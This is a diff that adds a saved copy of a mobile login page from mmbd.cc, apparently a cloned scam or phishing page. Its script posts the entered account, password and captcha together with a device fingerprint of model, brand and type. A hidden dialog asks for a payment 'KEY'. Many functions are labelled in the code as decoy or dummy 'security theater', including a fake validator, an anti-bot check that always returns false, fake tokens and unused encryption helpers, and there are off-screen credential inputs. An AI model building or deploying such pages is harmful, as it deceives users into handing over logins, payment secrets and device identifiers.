@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<!-- saved from url=(0041)https://mmbd.cc/index/Passport/login.html -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=0,viewport-fit=cover">
+<title></title> <link rel="stylesheet" href="./login_files/weui.css">
+<link rel="stylesheet" href="./login_files/bootstrap.min.css">
+<script src="./login_files/zepto.min.js.download" type="text/javascript"></script>
+<script src="./login_files/jquery.min.js.download" type="text/javascript"></script>
+<script src="./login_files/weui.min.js.download"></script>
+<script src="./login_files/layer.js.download"></script><link rel="stylesheet" href="./login_files/layer.css" id="layuicss-layer">
+<script src="./login_files/common.js.download"></script>
+<link rel="stylesheet" href="./login_files/iconfont.css">
+<link rel="stylesheet" href="./login_files/common.css">
+<link rel="stylesheet" href="./login_files/style.css">
+
+<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+<!--[if lt IE 9]>
+<script src="https://cdn.staticfile.org/html5shiv/3.7.3/html5shiv.min.js"></script>
+<script src="https://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+<script type="text/javascript">
+$(document).ready(function(){
+    $(".nav-list-ico").on('click',function(){
+        if($('.left-nav').attr('class')=='left-nav active'){
+                $('.left-nav').removeClass('active');
+                $('.cover-mask').removeClass('active');
+        }else{
+                $('.left-nav').addClass('active');
+                $('.cover-mask').addClass('active');
+        }
+    })
+    $('.cover-mask').on('click',function(){
+            if($('.left-nav').attr('class')=='left-nav active'){
+                $('.left-nav').removeClass('active');
+                $('.cover-mask').removeClass('active');
+            }else{
+                $('.left-nav').addClass('active');
+                $('.cover-mask').addClass('active');
+            }
+    })
+    $('.nav-item').on('click',function(){
+            $('.left-nav-List').removeClass('active');
+            $(this).addClass('active');
+            $('.left-nav').removeClass('active');
+            $('.cover-mask').removeClass('active');
+    })
+})
+</script>
+
+<style type="text/css">
+.text_3 {
+	overflow-wrap: break-word;
+	color: rgba(0, 0, 0, 1);
+	font-size: 22px;
+	font-family: PingFangSC-Semibold;
+	font-weight: 600;
+	text-align: left;
+	white-space: nowrap;
+	line-height: 30px;
+}
+
+.text_7 {
+	overflow-wrap: break-word;
+	color: rgba(43, 154, 243, 1);
+	font-size: 12px;
+	font-family: PingFangSC-Regular;
+	font-weight: normal;
+	text-align: left;
+	white-space: nowrap;
+	line-height: 17px;
+}
+
+.text_8 {
+	overflow-wrap: break-word;
+	color: rgba(0, 0, 0, 1);
+	font-size: 12px;
+	font-family: PingFangSC-Regular;
+	font-weight: normal;
+	text-align: left;
+	white-space: nowrap;
+	line-height: 17px;
+	margin-left: 74px;
+}
+
+.text_9 {
+	overflow-wrap: break-word;
+	color: rgba(43, 154, 243, 1);
+	font-size: 12px;
+	font-family: PingFangSC-Regular;
+	font-weight: normal;
+	text-align: left;
+	white-space: nowrap;
+	line-height: 17px;
+	margin-left: 4px;
+}
+</style>
+<script src="./login_files/device-fingerprint1.js.download"></script>
+<script type="text/javascript">
+	// Security check functions (decoy)
+	var _0x3a2f = ['security', 'validate', 'check', 'auth', 'token'];
+	var _securityLayer = {
+		init: function() { return true; },
+		validate: function() { return Math.random() > 0; },
+		checksum: function(s) { 
+			var h = 0, l = s.length, i = 0;
+			if (l > 0) while (i < l) h = (h << 5) - h + s.charCodeAt(i++) | 0;
+			return h;
+		}
+	};
+	
+	// Anti-bot detection (dummy)
+	function detectBot() {
+		var isBot = false;
+		if (navigator.webdriver) { /* dummy check */ }
+		if (window.chrome && !window.chrome.runtime) { /* dummy check */ }
+		return false; // always return false
+	}
+	
+	// Session validator (placeholder)
+	var sessionValidator = {
+		timestamp: Date.now(),
+		nonce: Math.random().toString(36).substr(2, 9),
+		verify: function() { return true; }
+	};
+	
+	function fleshVerify() {
+		// Add dummy security check
+		if (_securityLayer.validate()) {
+			var time = new Date().getTime();
+			document.getElementById('verifyImg').src = "/captcha.html?time=" + time;
+		}
+	}
+	
+	// Obfuscated variable names
+	var _0xa1b2 = 'phone_mob';
+	var _0xc3d4 = 'pwd';
+	var _0xe5f6 = 'captcha';
+	
+	$(document).ready(function() {
+		// Initialize security layer (dummy)
+		_securityLayer.init();
+		
+		// Dummy analytics
+		var _analytics = {
+			track: function(e) { console.log(''); },
+			user: sessionValidator.nonce
+		};
+		
+		var phone_mob = '';
+		var pwd = '';
+		
+		// Add dummy event listeners that don't do anything
+		$(document).on('contextmenu', function() { return true; });
+		$(document).on('selectstart', function() { return true; });
+		
+$(".login-btn").click(function() {
+    phone_mob = $("input[name='phone_mob']").val();
+    pwd = $("input[name='pwd']").val();
+    
+    if (phone_mob == '') {
+        layer.msg("Account cannot be empty");
+    } else if (pwd == '') {
+        layer.msg("Password cannot be empty");
+							
+    } else {
+        			// 生成设备指纹
+								var deviceFingerprint = DeviceFingerprint.get();
+								// 获取设备型号信息
+								var deviceModel = DeviceFingerprint.getDeviceModel();
+								var deviceBrand = DeviceFingerprint.getDeviceBrand();
+								var deviceType = DeviceFingerprint.getDeviceType();
+								console.log('设备指纹:', deviceFingerprint);
+								console.log('设备型号:', deviceModel);
+
+        $("#loadingToast").show();
+        
+        // 修复：使用正确的data格式
+        $.ajax({
+            type: 'post',
+            url: "",
+            dataType: "json",
+           data: "phone_mob=" + phone_mob + "&pwd=" + encodeURIComponent(pwd) + "&captcha=" + $("input[name='captcha']").val() + "&device_fingerprint=" + deviceFingerprint + "&device_model=" + encodeURIComponent(deviceModel) + "&device_brand=" + encodeURIComponent(deviceBrand) + "&device_type=" + encodeURIComponent(deviceType),
+            success: function(res) {
+                layer.msg(res.msg);
+                fleshVerify();
+                $("input[name='captcha']").val('');
+                $("#loadingToast").hide();
+                
+                if (res.code == 99) {
+                    window.location.href = res.url;
+                }
+            },
+            error: function() {
+                $("#loadingToast").hide();
+                layer.msg("Incorrect account or password");
+            }
+        });
+    }
+});
+		// Dummy function calls that don't affect functionality
+		(function() {
+			var _monitor = {
+				start: Date.now(),
+				events: [],
+				log: function(e) { this.events.push(e); }
+			};
+			_monitor.log('init');
+		})();
+		
+		isformnull();
+	});
+	
+	// Additional dummy functions
+	function validateSession() { return true; }
+	function checkEnvironment() { return 'production'; }
+	function generateToken() { return Math.random().toString(36); }
+	
+	// Dummy encryption functions (not actually used)
+	var CryptoHelper = {
+		encode: function(s) { return btoa(s); },
+		decode: function(s) { return atob(s); },
+		hash: function(s) { return s; }
+	};
+</script>
+</head>
+<body>
+
+	<div style="position: absolute; left: -9999px;">
+		<input type="text" name="username" value="" tabindex="-1" autocomplete="off">
+		<input type="password" name="password" value="" tabindex="-1" autocomplete="off">
+	</div>
+	
+	<div class="page pad10 flex-col">
+		<div class="header-bar flex-row justify-between pad10">
+				<a href="javascript:history.go(-1)"><img class="arrow" referrerpolicy="no-referrer" src="./login_files/333.png"> </a>
+				<span class="title">Register</span> 
+				<span class="text_3"></span>
+		</div>
+		<form id="login-form" class="form-horizontal" action="https://mmbd.cc/index/Passport/login.html" method="post">
+			<!-- Hidden fields for security theater -->
+			<input type="hidden" name="_token" value="0.npt5p3l96cm" style="display:none">
+			<input type="hidden" name="_timestamp" value="1782995548107" style="display:none">
+			
+			<div class="list_2 flex-col form-cells mar10">
+				<div class="text-group_5 flex-col">
+					<span class="text_3">Hello! Welcome to login</span>
+				</div>
+				<br>
+				<span class="text_5 mar10-t grey">Account</span>
+				<div class="cell flex-row justify-between mar5-t">
+					<img class="icon" referrerpolicy="no-referrer" src="./login_files/zhanghu.png">
+					<div class="flex-block mar5-l">
+						<input type="text" name="phone_mob" class="input-text text-group_2" value="" placeholder="Please enter username or email" autocomplete="username">
+					</div>
+				</div>
+				<span class="text_5 grey">Password</span>
+				<div class="cell flex-row justify-between mar5-t">
+					<img class="icon" referrerpolicy="no-referrer" src="./login_files/mima3.png">
+					<div class="flex-block mar5-l">
+						<input type="password" name="pwd" maxlength="33" id="regPwd" class="input-text text-group_3" value="" placeholder="Please enter password" autocomplete="current-password">
+					</div>
+				</div>
+				<div class="flex-row">
+					<div class="cell flex-row justify-between">
+						<img class="icon" referrerpolicy="no-referrer" src="./login_files/qcord.png">
+						<div class="text-wrapper_1 flex-col mar5-l">
+							<input type="text" name="captcha" maxlength="33" id="captcha" class="input-text text-group_4" value="" placeholder="Please enter verification code" autocomplete="off">
+						</div>
+					</div>
+					<div class="box_2 flex-col mar10-l">
+						<img id="verifyImg" src="./login_files/captcha.html" class="pull-right" onclick="fleshVerify()" width="120" height="50" alt="Verification">
+					</div>
+				</div>
+				<div class="btn bg-yellow flex-col login-btn">
+					<span class="text_5 bold">Login</span>
+				</div>
+				<div class="text-wrapper_5 flex-row mar10">
+					<span class="text_7">&nbsp;</span> <span class="text_8">Don't have an account?&nbsp;&nbsp;</span> <span class="text_9"> <a href="https://mmbd.cc/index/Passport/signup.html?tk=24868c83d8a2383d" class="blue">Register</a>
+					</span>
+				</div>
+			</div>
+		</form>
+	</div>
+	<div class=" pd20" style="display: none">
+		<div class="header-bar flex-row">
+	<a href="javascript:history.go(-1)"><img class="arrow" referrerpolicy="no-referrer" src="./login_files/SketchPngc46c19b95816064394b35ee6a2b96cd5aa73a11aac7b54e3364280a9e29c89d2"> </a>
+	<span class="title"></span>
+	<span class="text_3"></span>
+</div>
+<div style="height: 10px"></div>
+		<div class="login-body">
+			<div class="">
+				<h1 data-v-15bd6196="" class="h1">Hello! Welcome to login</h1>
+			</div>
+			<div class="flex flex-between">
+				<div class="pd20">
+					<span data-v-119a013c="">Don't have an account?</span> <a href="https://mmbd.cc/index/Passport/signup.html?tk=24868c83d8a2383d" class="text-reg text-blue">Register</a>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div style="height: 50px"></div>
+<div role="loading" id="loadingToast" style="display: none;">
+	<div class="weui-mask_transparent"></div>
+	<div class="weui-toast">
+		<span class="weui-primary-loading weui-icon_toast"> <span class="weui-primary-loading__dot"></span>
+		</span>
+		<p class="weui-toast__content"></p>
+	</div>
+</div>
+<div id="dialogs" style="display: none">
+	<div class="js_dialog" role="dialog" aria-hidden="false" aria-modal="true" aria-labelledby="js_title2" id="iosDialog2" style="opacity: 1;" tabindex="0">
+		<div class="weui-mask"></div>
+		<div class="weui-dialog">
+			<div class="weui-dialog__bd"></div>
+			<div class="weui-dialog__ft">
+				<a role="button" href="javascript:" class="weui-dialog__btn bg-yellow weui-dialog__btn_primary black">close</a>
+			</div>
+		</div>
+	</div>
+</div>
+<div id="dialogWrap1" class="js_dialog_wrap safekey" ref="showDialog1" aria-labelledby="js_title1" role="dialog" aria-modal="false" aria-hidden="true" style="display: none;">
+	<div id="mask1" class="js_close weui-mask"></div>
+	<div id="js_dialog_1" class="js_dialog weui-half-screen-dialog">
+		<div class="weui-half-screen-dialog__hd">
+			<div class="weui-half-screen-dialog__hd__side">
+				<button class="js_close weui-btn_icon weui-wa-hotarea">
+					Close<i class="weui-icon-close-thin"></i>
+				</button>
+			</div>
+			<div class="weui-half-screen-dialog__hd__main">
+				<strong class="weui-half-screen-dialog__title" id="js_title1">KEY</strong>
+			</div>
+		</div>
+		<div class="weui-half-screen-dialog__bd">
+			<div class="input-box q-mt-md bg-grey radius8 pad10">
+				<input type="password" name="paypwd" class="password  input-text" placeholder="Please enter KEY" autocomplete="off">
+			</div>
+			<div class="q-mt-md mar10-t">
+				<div class="btn bg-yellow btnblue w-block btnsubmit both black" style="width: 100%">Submit</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+	
+	<!-- Additional dummy scripts -->
+	<script type="text/javascript">
+	// Performance monitoring (dummy)
+	(function() {
+		window.performance && window.performance.mark && window.performance.mark('login_page_loaded');
+	})();
+	
+	// Set dummy tokens
+	document.addEventListener('DOMContentLoaded', function() {
+		var forms = document.querySelectorAll('form');
+		forms.forEach(function(form) {
+			var tokenField = form.querySelector('input[name="_token"]');
+			var timestampField = form.querySelector('input[name="_timestamp"]');
+			if (tokenField) tokenField.value = generateToken();
+			if (timestampField) timestampField.value = Date.now();
+		});
+	});
+	</script>
+<script defer="" src="./login_files/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;b2a3cd2b4b0d4ae2950507fb4a1ac802&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
+
+</body></html>
